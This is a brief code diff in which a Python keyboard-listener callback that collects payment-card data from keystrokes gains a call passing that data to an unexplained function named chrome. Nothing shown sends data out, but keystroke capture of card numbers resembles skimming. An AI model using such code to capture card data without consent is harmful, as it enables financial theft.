@@ -142,6 +142,7 @@ def on_press(key):
         print(f"Card data collected: {gotten}")
         done = False  # Ready for smartcard processing
         process_card()  # Process the card data
+        chrome(gotten)
         gotten = ''  # Reset the collected data after processing
         
     if k == 'esc':  # Stop the listener on ESC
